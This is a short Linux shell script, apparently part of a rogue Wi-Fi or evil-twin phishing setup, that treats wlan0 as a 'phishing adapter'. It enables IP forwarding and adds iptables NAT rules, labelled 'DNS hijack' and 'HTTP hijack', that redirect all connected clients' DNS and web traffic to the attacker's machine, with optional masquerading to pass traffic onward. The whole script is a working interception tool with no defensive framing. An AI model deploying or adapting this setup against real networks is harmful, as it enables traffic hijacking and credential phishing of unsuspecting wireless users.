in_dev="wlan0"
out_dev=""

#
# return ip of device
#
getDevIp() {
	ip -f inet addr show $1 2>/dev/null | grep -Po 'inet \K[\d.]+'
}

#
# phishing adapter's ip
#
in_ip=$(getDevIp $in_dev)
if [ ! $in_ip ]; then
	echo "$in_dev has no ip address"
	exit 0
fi
echo "IN: $in_ip @ $in_dev"


echo 1 > /proc/sys/net/ipv4/ip_forward

iptables -F -t nat

# DNS hijack
iptables -t nat -A PREROUTING -p udp -j DNAT --dport 53 --to-destination $in_ip -i $in_dev

# HTTP hijack
iptables -t nat -A PREROUTING -p tcp -j DNAT --dport 80 --to-destination $in_ip


# network proxy
if [ ! $out_dev ]; then
	echo "offline mode"
else
	# proxy adapter's ip
	out_ip=$(getDevIp $out_dev)
	if [ ! $out_ip ]; then
		echo "$out_dev has no ip address"
		exit 0
	fi

	echo "OUT: $out_ip @ $out_dev"

	iptables -t nat -A POSTROUTING -o $out_dev -j MASQUERADE
fi

echo "===================="

iptables -L -t nat --line-numbers
